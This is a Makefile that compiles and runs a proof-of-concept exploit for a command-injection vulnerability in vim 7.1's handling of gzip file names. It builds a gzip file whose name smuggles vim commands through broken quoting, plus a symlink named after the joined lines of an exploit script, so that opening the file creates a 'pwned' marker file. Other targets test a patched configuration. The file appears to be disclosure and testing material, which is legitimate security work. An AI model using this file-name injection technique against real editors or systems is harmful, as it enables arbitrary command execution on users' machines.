# Makefile for rdancer's exploit of the vim 7.1 xpm.vim vulnerability
#
# Usage {{{1
#
# There are three interested targets:
#
#	(1) make sploit
#
#	    Compiles the exploit.
#
#	(2) make demo
#
#	    This is the default target.  Compile and run the exploit.
#
#	(3) make test
#	
#	    Compile and run exploit non-interactively.

# Variables {{{1
#
EXPLOIT_DIR = "sploit"
# XXX Which other extensions are valid?
EXPLOIT_EXTENSIONS = .gz
# The name of the compiled exploit.  The single quotes are there to finish and
# restart the quoting in the script we're exploiting.  INITIAL and FINAL are
# variable within limits
INITIAL = "foo"
FINAL = "bar"
EXPLOIT_NAME = $(EXPLOIT_DIR)/$(INITIAL)'|sil!so%"'$(FINAL).gz
EXPLOIT_INTERIM = "`readlink member`"

# Be very verbose -- use for debugging
#VIM_OPTIONS := -V16

# This is the name of the file created by the exploit
PWN_FILE = "pwned"

#
# Targets {{{1
#
# demo -- Run the exploit {{{2
.PHONY: demo
demo: sploit
	rm -f -- $(PWN_FILE)
	vim $(VIM_OPTIONS) -- $(EXPLOIT_NAME)
	@if test -f $(PWN_FILE); then \
		echo "Exploit worked -- see the \`\`pwned'' file."; \
	else \
		echo "Exploit didn't work."; \
		exit 1; \
	fi

# test -- Test whether the exploit works {{{2
.PHONY: test
test: VIM_OPTIONS := ${VIM_OPTIONS} +:q
test: demo

# sploit -- Compile the exploit {{{2
.PHONY: sploit
sploit: member pi_gzip.txt
	rm -f -- $(EXPLOIT_INTERIM)
	rm -f -- $(EXPLOIT_INTERIM).gz
	cat pi_gzip.txt > $(EXPLOIT_INTERIM)
	mkdir -p -- $(EXPLOIT_DIR)
	gzip -c -- $(EXPLOIT_INTERIM) > $(EXPLOIT_NAME)
	rm -f exploit
	ln -s -- $(EXPLOIT_NAME) exploit

member: exploit.vim
	rm -f -- member
	# Expand all occurrences of PWN_FILE
	t=`{ \
		echo; \
		sed "s#PWN_FILE#"$(PWN_FILE)"#g; \
				/^\"/d; \
				/^$$/d;" \
		| tr '\n' '|'; \
		echo; \
		echo \"; \
	} < exploit.vim`; \
	ln -s -- "$$t" member
	ls -l member

# all -- Make all exploit flavours and extensions {{{2
all:
	export EXPLOIT_EXTENSION; \
	export EXPLOIT_FLAVOUR; \
	for EXPLOIT_EXTENSION in $(EXPLOIT_EXTENSIONS); do \
		EXPLOIT_FLAVOUR="`echo $$EXPLOIT_EXTENSION | sed s/.//`"; \
		make sploit; \
	done

# clean -- Remove most files we can remake {{{2
.PHONY: clean
clean:
ifeq (0,${MAKELEVEL})
	 export EXPLOIT_EXTENSION; \
	 for EXPLOIT_EXTENSION in $(EXPLOIT_EXTENSIONS); do \
		 make clean; \
	 done
	 rm -f -- $(PWN_FILE)
	 rm -f exploit
else
	 rm -f -- $(EXPLOIT_NAME)
	 rm -f -- $(EXPLOIT_INTERIM)
	 rm -f -- member
endif
  
# test-fixed -- Test the fixed filetype.vim {{{2
.PHONY: test-fixed
test-fixed: VIM_OPTIONS := -u gzip-fixed.vim ${VIM_OPTIONS}
test-fixed: test
	
# demo-fixed -- Demo the fixed filetype.vim {{{2
.PHONY: demo-fixed
demo-fixed: VIM_OPTIONS := -u gzip-fixed.vim ${VIM_OPTIONS}
demo-fixed: demo

#
# dist -- Make a distribution tarball {{{2
.PHONY: dist
dist: mrproper all clean
	make -C .. "`pwd | sed 's@.*/@@'`.tar.bz2"

#
# Modeline {{{1
#
# vim: foldmethod=marker :
